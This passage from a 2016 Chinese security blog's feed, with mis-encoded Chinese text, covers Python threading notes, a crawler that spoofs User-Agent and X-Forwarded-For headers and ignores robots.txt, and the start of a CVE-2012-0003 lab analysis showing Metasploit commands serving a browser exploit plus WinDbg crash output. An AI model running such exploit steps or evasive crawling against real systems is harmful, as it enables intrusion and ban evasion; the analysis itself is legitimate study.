ç›Šçš„,å¯ä»¥å¾ˆå¥½å¹³è¡¡ç­‰å¾…æ—¶é—´,æé«˜å¹¶å‘æ€§èƒ½.çº¿ç¨‹çš„é—®é¢˜ä¸»è¦æ˜¯çº¿ç¨‹çš„å®‰å…¨ç¨³å®šæ€§.çº¿ç¨‹æ— æ³•å¼ºåˆ¶ä¸­æ­¢,åŒæ—¶çº¿ç¨‹ä¸ä¸»è¿›ç¨‹å…±äº«å†…
å­˜,å¯èƒ½ä¼šå½±å“ä¸»è¿›ç¨‹çš„å†…å­˜ç®¡ç†.åœ¨pythoné‡Œçº¿ç¨‹å‡ºé—®é¢˜,å¯èƒ½ä¼šå¯¼è‡´ä¸»è¿›ç¨‹å´©æºƒ. è™½ç„¶pythoné‡Œçš„çº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿçš„çœŸå®çº¿ç¨‹
é‚£ä¹ˆæ€ä¹ˆè§£å†³å‘¢?é€šè¿‡æˆ‘ä»¬ç”¨è¿›ç¨‹æ–¹å¼.å­è¿›ç¨‹å´©æºƒå,ä¼šå®Œå…¨çš„é‡Šæ”¾æ‰€æœ‰çš„å†…å­˜å’Œé”™è¯¯çŠ¶æ€.æ‰€ä»¥è¿›ç¨‹æ›´å®‰å…¨. å¦å¤–é€šè¿‡è¿›ç¨‹,
pythonå¯ä»¥å¾ˆå¥½çš„ç»•è¿‡GIL,è¿™ä¸ªå…¨å±€é”é—®é¢˜. ä½†æ˜¯è¿›ç¨‹ä¹Ÿæ˜¯æœ‰å±€é™çš„.ä¸è¦å»ºç«‹è¶…è¿‡CPUæ€»æ ¸æ•°çš„è¿›ç¨‹,å¦åˆ™æ•ˆç‡ä¹Ÿä¸é«˜.

ç®€å•çš„æ€»ç»“ä¸€ä¸‹.
å½“æˆ‘ä»¬æƒ³å®ç°å¤šä»»åŠ¡å¤„ç†æ—¶,é¦–å…ˆè¦æƒ³åˆ°ä½¿ç”¨multiprocessing, ä½†æ˜¯å¦‚æœè§‰ç€è¿›ç¨‹å¤ªç¬¨é‡,é‚£ä¹ˆå°±è¦è€ƒè™‘ä½¿ç”¨çº¿ç¨‹. å¦‚æœå¤šä»»åŠ¡
å¤„ç†ä¸­éœ€è¦å¤„ç†çš„å¤ªå¤šäº†,å¯ä»¥è€ƒè™‘å¤šè¿›ç¨‹,æ¯ä¸ªè¿›ç¨‹å†é‡‡ç”¨å¤šçº¿ç¨‹.å¦‚æœè¿˜å¤„ç†ä¸è¦,å°±è¦ä½¿ç”¨è½®è¯¢æ¨¡å¼,æ¯”å¦‚ä½¿ç”¨poll event,
twistedç­‰æ–¹å¼.å¦‚æœæ˜¯GUIæ–¹å¼,åˆ™è¦é€šè¿‡äº‹ä»¶æœºåˆ¶,æˆ–è€…æ˜¯æ¶ˆæ¯æœºåˆ¶å¤„ç†,GUIä½¿ç”¨å•çº¿ç¨‹.æ‰€ä»¥åœ¨pythoné‡Œçº¿ç¨‹ä¸è¦ç›²ç›®ç”¨, ä¹Ÿ
ä¸è¦æ»¥ç”¨. ä½†æ˜¯çº¿ç¨‹ä¸å®‰å…¨æ˜¯äº‹å®.å¦‚æœä»…ä»…æ˜¯åšå‡ ä¸ªåå°ä»»åŠ¡,åˆ™å¯ä»¥è€ƒè™‘ä½¿ç”¨å®ˆæŠ¤çº¿ç¨‹åš.å¦‚æœéœ€è¦åšä¸€äº›å±é™©æ“ä½œ,å¯èƒ½ä¼š
å´©æºƒçš„,å°±ç”¨å­è¿›ç¨‹å»åš. å¦‚æœéœ€è¦é«˜åº¦ç¨³å®šæ€§,åŒæ—¶å¹¶å‘æ•°åˆä¸é«˜çš„æœåŠ¡.åˆ™å¼ºçƒˆå»ºè®®ç”¨å¤šè¿›ç¨‹çš„multiprocessingæ¨¡å—å®ç°.
åœ¨linuxæˆ–è€…æ˜¯unixé‡Œ,è¿›ç¨‹çš„ä½¿ç”¨ä»£ä»·æ²¡æœ‰windowsé«˜.è¿˜æ˜¯å¯ä»¥æ¥å—çš„.

                                                            --refer from baidu zhidao
more:
    https://www.zhihu.com/question/23474039
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 ç»å…¸å¤šçº¿ç¨‹å­¦ä¹ ç†è§£&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://blog.csdn.net/a921800467b/article/details/8579915
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-io--&quot;&gt;0x03 ç½‘ç»œio é˜»å¡|éé˜»å¡ åŒæ­¥|å¼‚æ­¥&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.cnblogs.com/Anker/p/3254269.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 å®ä¾‹&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;good
    http://www.2cto.com/kf/201504/395330.html 
    https://mugglecoding.gitbooks.io/qa/content/poolzen_yao_shi_yong.html

http://www.cnblogs.com/zhangchaoyang/articles/5188904.html çº¿ç¨‹æ± å®ç°
https://superxiaoxiong.github.io/2016/08/25/python-threadpool/
http://www.jb51.net/article/79631.htm
http://www.jb51.net/article/71911.htm
http://www.cnblogs.com/fnng/p/3670789.html
http://5ydycm.blog.51cto.com/115934/1435042
http://www.codexiu.cn/python/blog/939/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-attention&quot;&gt;0x04 attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;threadpool

    threadpoolçº¿ç¨‹æ± æ¨¡å—å·²ç»è¿‡æ—¶,å®˜æ–¹å¦‚ä¸‹è¯´æ˜,å»ºè®®ä½¿ç”¨multiprocessingæ¨¡å—ç”šè‡³æ˜¯ç”¨asyncioè¿™ä¸ªæ¨¡å—æ¥é€šè¿‡å¼‚æ­¥å®ç°

    This module is OBSOLETE and is only provided on PyPI to support old projects that still use it. Please DO
    NOT USE IT FOR NEW PROJECTS! Use modern alternatives like the multiprocessing module in the standard
    library or even an asynchroneous approach with asyncio

    multiprocessingå¤šè¿›ç¨‹å¤šçº¿ç¨‹æ¨¡å—
    https://docs.python.org/2.7/library/multiprocessing.html(pyå®˜æ–¹doc)

    asyncioå¼‚æ­¥ioæ¨¡å—(pyhton3.4æ–°å¢æ¨¡å—,py2æ²¡æœ‰)
    https://docs.python.org/3/library/asyncio.html#module-asyncio

2&amp;gt;join()å’ŒsetDaemonçš„åŒºåˆ«

    http://blog.csdn.net/zhangzheng0413/article/details/41728869
    åŠŸèƒ½åŸºæœ¬æ˜¯ç›¸åçš„
        thread.joinæ˜¯è¦æ±‚æ‰€æœ‰å­çº¿ç¨‹æ‰§è¡Œå®Œ,ä¸»çº¿ç¨‹æ‰ä¸é˜»å¡

        thread.setDaemon(True)æ˜¯å°†çˆ¶çº¿ç¨‹è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹,ä¹Ÿå³ä¸»çº¿ç¨‹æ‰§è¡Œå®Œåä¸ç®¡å­çº¿ç¨‹æœ‰æ²¡æœ‰æ‰§è¡Œå®Œ,å­çº¿ç¨‹ç›´æ¥ç»“æŸ,
        setDaemonè¦è®¾ç½®åœ¨thread.start()ä¹‹å‰

3&amp;gt;pool.apply()å’Œpool.map

eg.
from multiprocessing.dummy import Pool as ThreadPool
pool=ThreadPool(20)

forå¾ªç¯ä¸‹çš„pool.apply()ç›¸å½“äºpool.map

pool.apply()å’Œpool.apply_async()çš„åŒºåˆ«æ˜¯:apply_asyncæ˜¯å¹¶è¡Œå¤„ç†,applyä¸æ˜¯,å¿…é¡»ç­‰æ¯ä¸ªå­çº¿ç¨‹æ‰§è¡Œå®Œ
    apply
    It blocks until the result is ready, so apply_async() is better suited for performing work in parallel.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x05-important&quot;&gt;0x05 important&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;multiprocessingæ¨¡å—æ˜¯é‡ç‚¹

multiprocessing poolæºç è§£è¯»
http://www.bingtel.wang/python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E7%A8%8B%E4%B9%8Bmultiprocessing-pool%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB.html

https://docs.python.org/2.7/library/multiprocessing.html(pyå®˜æ–¹è‹±æ–‡doc)
http://python.usyiyi.cn/translate/python_278/library/index.html(ä¸­æ–‡doc)
http://stackoverflow.com/questions/4474940/unsupported-operand-types-exception-with-threappool-map-but-not-map

ä¸­æ–‡ä¸è¯¦å°½,è‹±æ–‡ä¸­è¯´åˆ°multiprocessing.dummyå°±æ˜¯multiprocessingçš„å¤åˆ¶ç‰ˆæœ¬,åªä¸è¿‡multiprocessing.dummyä½œç”¨äºçº¿ç¨‹
&quot;multiprocessing.dummy replicates the API of multiprocessing but is no more than a wrapper around the threading module.&quot;
æ‰€ä»¥å‚è€ƒmultiprocessingçš„apiæ¥ä½¿ç”¨æ“ä½œçº¿ç¨‹æ± å³å¯

pool.close()
    é˜²æ­¢ä»»ä½•æ›´å¤šçš„ä»»åŠ¡(å…¶ä»–æ²¡æœ‰å®‰æ’è¿‡çš„ä»»åŠ¡,mapè¿‡çš„ä»»åŠ¡ä¸å±äºè¿™ä¸ªèŒƒå›´)è¢«æäº¤åˆ°çº¿ç¨‹æ± ä¸­.ä¸€æ—¦æ‰€æœ‰çš„ä»»åŠ¡å·²ç»å®Œæˆäº†å·¥ä½œçº¿ç¨‹å°†é€€å‡º.

pool.terminate()
    ç«‹å³åœæ­¢çº¿ç¨‹æ± ä¸­çš„å·¥ä½œçº¿ç¨‹(æ— è®ºä»»åŠ¡æœ‰æ²¡æœ‰å®Œæˆ),ç»æµ‹è¯•å¹¶ä¸èƒ½åœæ­¢æ‰€æœ‰çš„çº¿ç¨‹æ± ä¸­è¦è¿›è¡Œçš„ä»»åŠ¡,åº”è¯¥
    æ˜¯åªèƒ½åœæ­¢å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä¸€ä¸ªå‡½æ•°è¿‡ç¨‹(å­çº¿ç¨‹)

    ä¸ºäº†åœæ­¢çº¿ç¨‹æ± ä¸­çš„æ‰€æœ‰çº¿ç¨‹,å°¤å…¶æ˜¯åœ¨çˆ†ç ´å¯†ç æ—¶,æŸä¸€ä¸ªçº¿ç¨‹å·²ç»çˆ†ç ´æˆåŠŸ,ä¸ºäº†è¾¾åˆ°&quot;åœæ­¢å…¶ä»–çš„å°†è¦æ‰§
    è¡Œçš„é€šè¿‡mapåŠ å…¥åˆ°poolçº¿ç¨‹æ± ä¸­çš„ä»»åŠ¡&quot;ç›¸åŒçš„æ•ˆæœ,åœ¨æ¯ä¸ªçº¿ç¨‹ä¸­çš„å¼€å¤´åˆ¤æ–­æ˜¯å¦å·²ç»çˆ†ç ´æˆåŠŸ,æˆåŠŸåˆ™ç›´
    æ¥return,ä¸æˆåŠŸåˆ™ç»§ç»­æœ¬çº¿ç¨‹åº”è¯¥å®Œæˆçš„å·¥ä½œ

pool.join()
    ç­‰å¾…çº¿ç¨‹æ± ä¸­çš„å·¥ä½œçº¿ç¨‹é€€å‡º,å¿…é¡»å…ˆä½¿ç”¨pool.close()æˆ–è€…pool.terminate()æ‰èƒ½è°ƒç”¨join()


concurrent.futures(python3.2æ–°å¢æ¨¡å—)

    https://docs.python.org/3/library/concurrent.futures.html
    ThreadPoolExecutorçº¿ç¨‹æ± 
    ProcessPoolExecutorè¿›ç¨‹æ± 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x06-my-easycrawl-code&quot;&gt;0x06 my easy_crawl code&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def get_random_ua():
    #å¾—åˆ°éšæœºuser-agentå€¼
    f=open(&quot;dicts/user-agents.txt&quot;,&quot;r+&quot;)
    all_user_agents=f.readlines()
    f.close()
    random_ua_index=random.randint(0,len(all_user_agents)-1)
    ua=re.sub(r&quot;(\s)$&quot;,&quot;&quot;,all_user_agents[random_ua_index])
    return ua

def get_random_x_forwarded_for():
    #å¾—åˆ°éšæœºx-forwarded-forå€¼
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(xrange(1, 255), 4)
    return &#39;.&#39;.join(str(_) for _ in numbers)


def get_request(uri):
    #å‘å‡ºgetè¯·æ±‚,è¿”å›å€¼ä¸ºä¸€ä¸ªå­—å…¸,æœ‰ä¸‰ä¸ªé”®å€¼å¯¹:eg.{&quot;code&quot;:200,&quot;title&quot;:None,&quot;content&quot;:&quot;&quot;}
    #codeæ˜¯intç±»å‹
    #titleå¦‚æœæ²¡æœ‰åˆ™è¿”å›None,æœ‰åˆ™è¿”å›strç±»å‹
    #contentå¦‚æœæ²¡æœ‰åˆ™è¿”å›&quot;&quot;
    try:
        import mechanize
    except:
        os.system(&quot;pip install mechanize&quot;)
        import mechanize
    try:
        import cookielib
    except:
        os.system(&quot;pip install cookielib&quot;)
        import cookielib
    try:
        br = mechanize.Browser()
        br.set_cookiejar(cookielib.LWPCookieJar()) # Cookie jar
        br.set_handle_equiv(True) # Browser Option
        br.set_handle_gzip(False)# use to be True
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        ua=get_random_ua()
        x_forwarded_for=get_random_x_forwarded_for()
        br.addheaders = [(&#39;User-agent&#39;, &#39;%s&#39; % ua),(&#39;X-Forwarded-For&#39;,&#39;%s&#39; % x_forwarded_for)]
        br.open(uri)
        br._factory.is_html = True
        code=br.response().code
        title=br.title()
        content=br.response().read()
    except mechanize.HTTPError as e:
        code=e.code
        content=e.read()
        soup=BeautifulSoup(content,&quot;lxml&quot;)
        title=soup.title.string
    return_value={&#39;code&#39;:code,&#39;title&#39;:title,&#39;content&#39;:content}
    #print return_value
    return return_value


def collect_uris_from_uri(uri):
#ä»uriæ‰€åœ¨çš„htmlå†…å®¹ä¸­æ”¶é›†uriåˆ°urié˜Ÿåˆ—
#è¿”å›å€¼æ˜¯ä¸€ä¸ªå­—å…¸,{&#39;y1&#39;:y1,&#39;y2&#39;:y2}
#y1æ˜¯æ ¹æ®å‚æ•°uriå¾—åˆ°çš„htmlé¡µé¢ä¸­çš„æ‰€æœ‰uri,æ˜¯ä¸ªåˆ—è¡¨ç±»å‹
#y2æ˜¯å‚æ•°uriå¯¹åº”çš„ä¸‰ä¸ªå…³é”®å…ƒç´ ,y2æ˜¯ä¸ªå­—å…¸ç±»å‹,eg.{&quot;code&quot;:200,&quot;title&quot;:None,&quot;content&quot;:&quot;&quot;}
    all_uris=[]
    result=get_request(uri)
    content=result[&#39;content&#39;]
    bs=BeautifulSoup(content,&quot;lxml&quot;)
    for each in bs.find_all(&#39;a&#39;):
        find_uri=each.get(&#39;href&#39;)
        all_uris.append(find_uri)
    return {&#39;y1&#39;:all_uris,&#39;y2&#39;:result}


class MyThread(threading.Thread):
    def __init__(self,func,args,name=&#39;&#39;):
        threading.Thread.__init__(self)
        self.name=name
        self.func=func
        self.args=args
    def run(self):
        self.result=apply(self.func,self.args)
    def get_result():
        return self.result

def crawl_uri(uri):
    #çˆ¬è™«,å¯è·å–uriå¯¹åº”ç½‘ç«™çš„æ‰€æœ‰å¯æŠ“å–çš„uriå’Œæ‰€æœ‰ç½‘é¡µä¸‰å…ƒç´ :code,title,content
    uris_queue=Queue.Queue()
    uris_uri_keyvalues={}
    #uriå’Œuriçš„ä¸‰ä¸ªå…ƒç´ çš„å¯¹åº”å€¼ä¸ºä¸€ä¸ªå­—å…¸çš„é”®å€¼å¯¹
    #eg{&#39;http://www.baiud.com&#39;:{&#39;code&#39;:code,&#39;title&#39;:title,&#39;content&#39;:content},&quot;&quot;:{},&quot;&quot;:{},...}
    #ç”¨äºæ”¶é›†uriä¸å¯¹åº”çš„ä¸‰ä¸ªå…ƒç´ çš„å€¼,æ”¶é›†åè€ƒè™‘å¯èƒ½ç»Ÿä¸€å­˜å…¥æ•°æ®åº“

    #æ”¶é›†ç›¸åŒåŸŸåç½‘ç«™å†…çš„uris
    domain_uris=[]
    #æ”¶é›†äºŒçº§åŸŸå
    subdomain_uris=[]
    def task_finish_func():
        while True:
            current_uri=uris_queue.get()
            http_domain=get_http_domain_from_uri(current_uri)
            #eg.main_domain_prefixä»http://www.freebuf.comä¸­å¾—åˆ°www
            #main_domain_key_valueä»http://www.freebuf.comä¸­å¾—åˆ°freebuf
            main_domain_prefix=re.search(r&quot;http(s)?://([^\.]*)\.([^\./]*)&quot;,current_uri).group(2)
            main_domain_key_value=re.search(r&quot;http(s)?://([^\.]*)\.([^\./]*)&quot;,current_uri).group(3)
            #print main_domain_prefix
            #print main_domain_key_value
            #raw_input()
            result=collect_uris_from_uri(current_uri)
            uris=result[&#39;y1&#39;]
            for each in uris:
                #collect_uris_from_uriå¾—åˆ°çš„ç»“æœä¸­çš„å…ƒç´ å¯èƒ½æ˜¯None
                if each is not None:
                    tmp=get_http_domain_pattern_from_uri(http_domain)
                    http_domain_pattern=re.compile(r&quot;%s&quot; % tmp)
                    if re.match(http_domain_pattern,each):
                        each=re.sub(r&quot;/$&quot;,&quot;&quot;,each)
                        if each not in domain_uris:
                            print each
                            domain_uris.append(each)
                            #print domain_uris
                            uris_queue.put(each)
                    sub_pattern=re.compile(r&quot;http(s)?://[^\.]*(?&amp;lt;!%s)\.%s&quot; % (main_domain_prefix,main_domain_key_value))
                    if re.match(sub_pattern,each):
                        each_subdomain=get_http_domain_from_uri(each)
                        if each_subdomain not in subdomain_uris:
                            #äºŒçº§åŸŸååªå°†http_domainéƒ¨åˆ†åŠ å…¥æ”¶è—,ä¸æ”¾åˆ°é˜Ÿåˆ—é‡Œ
                            print each_subdomain
                            subdomain_uris.append(each_subdomain)
            uris_uri_keyvalues[&#39;%s&#39; % uri]=result
            uris_queue.task_done()


    #åˆå§‹åŒ–
    uri=re.sub(r&quot;(/{0,2}(\s){0,2})$&quot;,&quot;&quot;,uri)
    start_uris=[uri]
    http_domain=get_http_domain_from_uri(uri)
    if uri!=http_domain:
        start_uris.append(http_domain)
    for each in start_uris:
        uris_queue.put(each)

    &#39;&#39;&#39;ä¼ ç»Ÿå¤šçº¿ç¨‹
    mythreads=[]
    start=time.time()
    for i in range(15):
        mythread=MyThread(task_finish_func,())
        mythreads.append(mythread)
    for i in range(15):
        mythreads[i].setDaemon(True)
        mythreads[i].start()
        print &quot;%s threads started&quot; % str(i)
    uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #upon threads=200 ===&amp;gt; 38,16
    #threads=5 ===&amp;gt; 12,16
    #threads=10 4,16
    #threads=15 3.4,16
    &#39;&#39;&#39;

    &#39;&#39;&#39;å•çº¿ç¨‹
    start=time.time()
    task_finish_func()
    uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #thread=1 task_finish_funcä¸­while Trueæ”¹æˆwhile uris_queue.empty() is False,è¦ä¸ç„¶ä¸ä¼šæ‰§è¡Œåˆ°æœ€å    19.4,16
    &#39;&#39;&#39;

    mythreads=[]
    start=time.time()
    pool=ThreadPool(15)
    for i in range(15):
        #è¿™é‡Œæ¯”è¾ƒç‰¹æ®Š,å› ä¸ºå‡½æ•°task_finish_funcæ˜¯ä¸ªæ— é™å¾ªç¯çš„å‡½æ•°,æ‰€ä»¥å°±ç®—è¿™é‡Œå¼€20ä¸ªçº¿ç¨‹ä¹Ÿä¼šå› ä¸ºçº¿ç¨‹æ± ä¸­åªæœ‰15ä¸ª
        #ä½ç½®ä½¿å¾—ä¸€ç›´åªæœ‰15ä¸ªçº¿ç¨‹åœ¨è¿è¡Œ,å¤šä½™çš„5ä¸ªçº¿ç¨‹ç›¸å½“äºæ²¡æœ‰è®¾ç½®ä¸€æ ·
        pool.apply_async(task_finish_func,())
    pool.close()

    while 1:
        #è¿™é‡Œçš„ifå–ä»£ä¸‹é¢çš„uris_queue.join(),æœ‰æ—¶çˆ¬è™«è¢«banæ—¶,å¦‚æœç”¨uris_queue.join()ä¼šæ— é™ç­‰å¾…
        num_of_result=len(domain_uris)
        sleep(15)
        if len(domain_uris)==num_of_result:
            print &quot;finished,if the number of uris you get is not big enough,you may be banned to crawl :(&quot;
            break

    #uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #threads=15(pool_size=15,for_range=20) 4.15,16
    #threads=20(pool_size=20,for_range=20) 9.2,16
    #threads=10(pool_size=10,for_range=20) 4.2,16

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 30 Aug 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/08/30/python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/</link>
        <guid isPermaLink="true">/python/2016/08/30/python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/</guid>
        
        <category>python</category>
        
        <category>coding</category>
        
        <category>effective</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>pythonä»£ç æ•ˆç‡</title>
        <description>&lt;h3 id=&quot;x00-&quot;&gt;0x00 ä¸¤ç§è¯»æ–‡ä»¶çš„ä¸åŒæ•ˆç‡&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#ç¬¬ä¸€ç§:f=open(),for each in f
import time
start=time.clock()
count=0
f=open(&quot;webshell_passwords.txt&quot;,&quot;r+&quot;)
for each in f:
    count+=1
end=time.clock()
print end-start
f.close()

#ç¬¬äºŒç§:f=open(),all=f.readlines(),for each in all
start1=time.clock()
count1=0
f=open(&quot;webshell_passwords1.txt&quot;,&quot;r+&quot;)
all=f.readlines()
for each in all:
    count1+=1
end1=time.clock()
print end1-start1
f.close()

&#39;&#39;&#39;
è¾“å‡º:
0.001017
0.001255

ç»“è®º:
f.readlines()æ˜¯å¤šä½™çš„è¿ä½œ,è¿™æ ·æµªè´¹ç³»ç»Ÿèµ„æº
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 26 Aug 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/08/26/python%E4%BB%A3%E7%A0%81%E6%95%88%E7%8E%87/</link>
        <guid isPermaLink="true">/python/2016/08/26/python%E4%BB%A3%E7%A0%81%E6%95%88%E7%8E%87/</guid>
        
        <category>coding</category>
        
        <category>efficient</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>æ¼æ´æˆ˜äº‰-cve-2012-0003</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;è¿™ä¸ªæ¼æ´æ˜¯ç”±äºå¾®è½¯çš„å¤šåª’ä½“åº“winmm.dll(c:\windows\system32\winmm.dll)åœ¨å¤„ç†MIDIæ–‡ä»¶æ—¶,ç”±äºå¯¹æ•°æ®çš„å¤„ç†ä¸å½“å¯¼è‡´çš„å †æº¢å‡º,æ”»å‡»è€…å¯ä»¥åœ¨ç½‘é¡µä¸­åµŒå…¥ç‰¹
æ®Šçš„MIDIæ–‡ä»¶æ¥è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 å‡†å¤‡å·¥ä½œ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;ä½¿ç”¨msfä¸­çš„exp
    msfconsole
    search cve-2012-0003
    use exploit/windows/browser/ms12_004_midi
    set uripath test.html
    set payload windows/exec
    set cmd calc.exe
        server started
        http://192.168.3.165:8080/test.html
    å¥‡æ€ªçš„æ˜¯åœ¨ç³»ç»Ÿä¸­ä¸å­˜åœ¨test.html,ä½†æ˜¯è®¿é—®ä¸Šé¢ç”Ÿæˆçš„ç½‘é©¬é“¾æ¥ç¡®å®ä¼šä¸­é©¬,åæ¥æŸ¥çœ‹msfä¸­çš„exp:ms12_004_midi.rb,é‡Œ
    é¢ç”Ÿæˆhtmlçš„ä»£ç ä¸º
        send_response(cli, html, {&#39;Content-Type&#39;=&amp;gt;&#39;text/html&#39;})
    send_responseå‡½æ•°åœ¨msfapiä¸­æœ‰å¦‚ä¸‹ç”¨æ³•
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HttpServer/HTML.html#send_response_html-instance_method&quot;&gt;msfapi_send_response&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ä¹Ÿå³ç›¸å½“äºmsfå†…ç½®webserveré€šè¿‡send_responseå‡½æ•°å‘é€htmlä»£ç åˆ°å®¢æˆ·ç«¯å®ç°ä¸‹é¢è¿™ä¸ªé“¾æ¥çš„è®¿é—®
        http://192.168.3.165:8080/test.html
    è¿™ç§æ–¹å¼æ¯”è¾ƒå¥‡ç‰¹,å¤§æ¦‚æ˜¯ä»è¾ƒåº•å±‚æ¥å®ç°çš„

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01--1&quot;&gt;0x01 è°ƒè¯•åˆ†æ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;æ‰“å¼€iexplore.exe
win+r:cmd
gflags -i iexplore.exe +hpa
    è¿™é‡Œå¦‚æœåœ¨windbgä¸­è®¾ç½®!gflag +hpaä¸ä¼šæˆåŠŸ,å¯èƒ½æ˜¯winxpæˆ–æ˜¯windbgçš„é—®é¢˜
windbg:f6é™„åŠ iexplore.exe
!gflag
    0:016&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
ieæ‰“å¼€http://192.168.3.165:8080/test.html
    (7ac.208): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=15467019 edi=15464f60
    eip=76b2d224 esp=34c6fe80 ebp=34c6fea0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    WINMM!midiOutPlayNextPolyEvent+0x1ec:
    76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:15467019=??

    åˆ°è¿™é‡ŒåªçŸ¥é“76b2d224å¤„æœ‰å†…å­˜è®¿é—®å¼‚å¸¸,ç„¶è€Œè¦æƒ³å†™å‡ºexp,è¿˜éœ€è¦å¼„æ¸…å‚æ•°ä¼ é€’è¿‡ç¨‹,è¿™ä¸ª&quot;å †æº¢å‡º&quot;cveçš„åˆ©ç”¨ä¸æ˜¯
    DWORD SHOOT,è€Œæ˜¯å·§å¦™åœ°æ„é€ htmlä»£ç è¾¾åˆ°æ§åˆ¶eipçš„ç›®çš„,å¦‚æœæ˜¯åˆ©ç”¨å †æº¢å‡º,ä¸€èˆ¬ä¼šæƒ³åˆ°åœ¨ä¸Šé¢è®¿é—®å¼‚å¸¸æ—¶é€šè¿‡æ‰¾åˆ°ä¸€ä¸ª
    DWORD SHOOTçš„æœºä¼šæ¥è¦†ç›–å¼‚å¸¸å¤„ç†ç›¸å…³çš„å‡½æ•°åœ°å€æ¥æ§åˆ¶eip,ä¸”è¦åœ¨å¯æ§æ•°æ®å¤åˆ¶åˆ°å†…å­˜åæ‰¾åˆ°å †åˆ†é…è°ƒç”¨

win+r:cmd
gflags -i iexplore.exe -hpa
bu WINMM!midiOutPlayNextPolyEvent
g
ieæ‰“å¼€http://192.168.3.165:8080/test.html
    Breakpoint 0 hit
    eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=00216790 esi=00216780 edi=002167d8
    eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    WINMM!midiOutPlayNextPolyEvent:
    76b2d038 8bff            mov     edi,edi
    æ­¤æ—¶ä¸­æ–­ä¸‹æ¥

    






&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 23 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/23/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0003/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/23/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0003/</guid>
        
        <category>æ¼æ´æˆ˜äº‰</category>
        
        <category>æ¼æ´åˆ†æ</category>
        
